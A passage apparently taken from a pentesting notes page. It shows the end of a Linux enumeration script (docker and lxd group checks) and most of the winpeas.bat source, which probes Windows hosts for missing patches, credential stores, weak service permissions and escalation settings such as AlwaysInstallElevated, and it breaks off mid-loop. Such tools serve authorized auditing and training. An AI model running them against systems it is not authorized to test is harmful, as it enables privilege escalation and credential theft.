if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
fi
}

docker_checks()
{

#specific checks - check to see if we're in a docker container
dockercontainer=` grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n$dockercontainer" 
  echo -e "\n"
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n$dockerhost" 
  echo -e "\n"
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33m[+] We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n$dockergrp" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n$dockerfiles" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n$dockeryml" 
  echo -e "\n"
fi
}

lxc_container_checks()
{

#specific checks - are we in an lxd/lxc container
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$lxccontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n$lxccontainer"
  echo -e "\n"
fi

#specific checks - are we a member of the lxd group
lxdgroup=`id | grep -i lxd 2>/dev/null`
if [ "$lxdgroup" ]; then
  echo -e "\e[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n$lxdgroup"
  echo -e "\n"
fi
}

footer()
{
echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" 
}

call_each()
{
  header
  debug_info
  system_info
  user_info
  environmental_info
  job_info
  networking_info
  services_info
  software_configs
  interesting_files
  docker_checks
  lxc_container_checks
  footer
}

while getopts "h:k:r:e:st" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    t) thorough=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

call_each | tee -a $report 2> /dev/null
#EndOfScript
```
### windows

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

- winpeas.bat
```
@echo off

set long=no


echo             *((,.,/((((((((((((((((((((/,  */               
echo      ,/*,..*(((((((((((((((((((((((((((((((((,           
echo    ,*/((((((((((((((((((/,  .*//((//**, .*((((((*       
echo    ((((((((((((((((* *****,,,/########## .(* ,((((((   
echo    (((((((((((/* ******************/####### .(. ((((((
echo    ((((((..******************/@@@@@/***/######* /((((((
echo    ,,..**********************@@@@@@@@@@(***,#### ../(((((
echo    , ,**********************#@@@@@#@@@@*********##((/ /((((
echo    ..(((##########*********/#@@@@@@@@@/*************,,..((((
echo    .(((################(/******/@@@@@#****************.. /((
echo    .((########################(/************************..*(
echo    .((#############################(/********************.,(
echo    .((##################################(/***************..(
echo    .((######################################(************..(
echo    .((######(,.***.,(###################(..***(/*********..(
echo   .((######*(#####((##################((######/(********..(
echo    .((##################(/**********(################(**...(
echo    .(((####################/*******(###################.((((  
echo    .(((((############################################/  /((
echo    ..(((((#########################################(..(((((.
echo    ....(((((#####################################( .((((((.
echo    ......(((((#################################( .(((((((.
echo    (((((((((. ,(############################(../(((((((((.
echo        (((((((((/,  ,####################(/..((((((((((.
echo              (((((((((/,.  ,*//////*,. ./(((((((((((.
echo                 (((((((((((((((((((((((((((/"
echo                        by carlospolop
echo
echo Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
echo
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] BASIC SYSTEM INFO ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WINDOWS OS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check for vulnerabilities for the OS version with the applied patches
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
systeminfo
echo.
wmic qfe get Caption,Description,HotFixID,InstalledOn | more
echo.
echo.
set expl=no
for /f "tokens=3-9" %%a in ('systeminfo') do (echo "%%a %%b %%c %%d %%e %%f %%g" | findstr /i "2000 XP 2003 2008 vista" && set expl=yes) & (echo "%%a %%b %%c %%d %%e %%f %%g" | findstr /i /C:"windows 7" && set expl=yes)
IF "%expl%" == "yes" echo [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2592799" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3143141" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS16-032 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS11-011 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB982799" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-59 patch is NOT installed! (Vulns: 2K8,Vista,7/SP0-Chimichurri)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979683" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-21 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2305420" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-092 patch is NOT installed! (Vulns: 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB981957" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-073 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB4013081" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS17-017 patch is NOT installed! (Vulns: 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB977165" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS10-015 patch is NOT installed! (Vulns: 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB941693" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS08-025 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB920958" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS06-049 patch is NOT installed! (Vulns: 2K/SP4-ZwQuerySysInfo)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB914389" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS06-030 patch is NOT installed! (Vulns: 2K,XP/SP2-Mrxsmb.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB908523" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS05-055 patch is NOT installed! (Vulns: 2K/SP4-APC Data-Free)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB890859" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS05-018 patch is NOT installed! (Vulns: 2K/SP3/4,XP/SP1/2-CSRSS)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB842526" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-019 patch is NOT installed! (Vulns: 2K/SP2/3/4-Utility Manager)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB835732" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-011 patch is NOT installed! (Vulns: 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB841872" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS04-020 patch is NOT installed! (Vulns: 2K/SP4-POSIX)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2975684" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS14-040 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3136041" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS16-016 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3057191" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS15-051 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2989935" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS14-070 patch is NOT installed! (Vulns: 2K3/SP2-TCP/IP)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2778930" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-005 patch is NOT installed! (Vulns: Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2850851" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-053 patch is NOT installed! (Vulns: 7SP0/SP1_x86-schlamperei)
IF "%expl%" == "yes" wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2870008" 1>NUL
IF "%expl%" == "yes" IF errorlevel 1 echo MS13-081 patch is NOT installed! (Vulns: 7SP0/SP1_x86-track_popup_menu)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DATE and TIME ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You may need to adjust your local date/time to exploit some vulnerability
date /T
time /T
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Audit Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check what is being logged
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WEF Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check where are being sent the logs
REG QUERY HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] LAPS installed? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check what is being logged
REG QUERY "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] LSA protection? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Active if "1"
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Credential Guard? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Active if "1" or "2"
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WDigest? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Plain-text creds in memory if "1"
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Number of cached creds ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You need System to extract them
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] UAC Settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Registered Anti-Virus(AV) ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
echo.
echo.
echo Checking for defender whitelisted PATHS
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] PS settings ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo PowerShell v2 Version:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine /v PowerShellVersion
echo PowerShell v5 Version:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine /v PowerShellVersion
echo Transcriptions Settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
echo Module logging settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
echo Scriptblog logging settings:
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
echo.
echo PS default transcript history
dir %SystemDrive%\transcripts\
echo.
echo Checking PS history file
dir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] MOUNTED DISKS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Maybe you find something interesting
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ENVIRONMENT ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Interesting information?
set
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] INSTALLED SOFTWARE ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Some weird software? Check for vulnerabilities in unknow software installed
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
dir /b "C:\Program Files" "C:\Program Files (x86)" | sort
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr InstallLocation | findstr ":\\"
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\ /s | findstr InstallLocation | findstr ":\\"
IF exist C:\Windows\CCM\SCClient.exe echo SCCM is installed (installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Remote Desktop Credentials Manager ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
IF exist "%AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" echo Found: RDCMan.settings in %AppLocal%\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings, check for credentials in .rdg files
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WSUS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\ 2>nul | findstr /i "wuserver" | findstr /i "http://"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] RUNNING PROCESSES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Something unexpected is running? Check for vulnerabilities
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
tasklist /SVC
echo.
echo [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
echo.
echo [i] Checking directory permissions of running processes (DLL injection)
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] RUN ^AT STARTUP ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
::(autorunsc.exe -m -nobanner -a * -ct /accepteula 2>nul || wmic startup get caption,command 2>nul | more & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "C:\Documents and Settings\%username%\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. & ^
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab informa")
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] AlwaysInstallElevated? ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] If '1' then you can install a .msi file with admin privileges ;)
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2> nul
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] NETWORK ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT SHARES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net share
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] INTERFACES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
ipconfig  /all
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] USED PORTS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check for services restricted from the outside
netstat -ano | findstr /i listen
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FIREWALL ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
netsh firewall show state
netsh firewall show config
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ^ARP ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
arp -A
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ROUTES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
route print
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Hosts file ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
type C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CACHE DNS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WIFI ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] To get the clear-text password use: netsh wlan show profile <SSID> key=clear
netsh wlan show profile
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^>[*] BASIC USER INFO ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT USER ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net user %username%
net user %USERNAME% /domain 2>nul
whoami /all
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] USERS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net user
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] GROUPS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net localgroup
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] ADMINISTRATORS GROUPS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
net localgroup Administrators 2>nul
net localgroup Administradores 2>nul
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT LOGGED USERS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
quser
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Kerberos Tickets ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
klist
echo. 
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CURRENT CLIPBOARD ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Any password inside the clipboard?
powershell -command "Get-Clipboard" 2>nul
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] SERVICES VULNERABILITIES ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo.
::echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE PERMISSIONS WITH accesschk.exe FOR 'Authenticated users', Everyone, BUILTIN\Users, Todos and CURRENT USER ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo [i] If Authenticated Users have SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG or WRITE_DAC or WRITE_OWNER or GENERIC_WRITE or GENERIC_ALL, you can modify the binary that is going to be executed by the service and start/stop the service
::echo [i] If accesschk.exe is not in PATH, nothing will be found here
::echo [I] AUTHETICATED USERS
::accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul
::echo [I] EVERYONE
::accesschk.exe -uwcqv "Everyone" * /accepteula 2>nul
::echo [I] BUILTIN\Users
::accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
::echo [I] TODOS
::accesschk.exe -uwcqv "Todos" * /accepteula 2>nul
::echo [I] %USERNAME%
::accesschk.exe -uwcqv %username% * /accepteula 2>nul
::echo.
::echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE PERMISSIONS WITH accesschk.exe FOR * ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
::echo [i] Check for weird service permissions for unexpected groups"
::accesschk.exe -uwcqv * /accepteula 2>nul

echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SERVICE BINARY PERMISSIONS WITH WMIC + ICACLS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f "tokens=2 delims='='" %%a in ('cmd.exe /c wmic service list full ^| findstr /i "pathname" ^|findstr /i /v "system32"') do (
    for /f eol^=^"^ delims^=^" %%b in ("%%a") do icacls "%%b" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos usuarios %username%" && echo.
)
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f %%a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv >nul 2>&1 & reg save %%a %temp%\reg.hiv >nul 2>&1 && reg restore %%a %temp%\reg.hiv >nul 2>&1 && echo You can modify %%a
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] UNQUOTED SERVICE PATHS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Progam.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
echo [i] The permissions are also checked and filtered using icacls
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
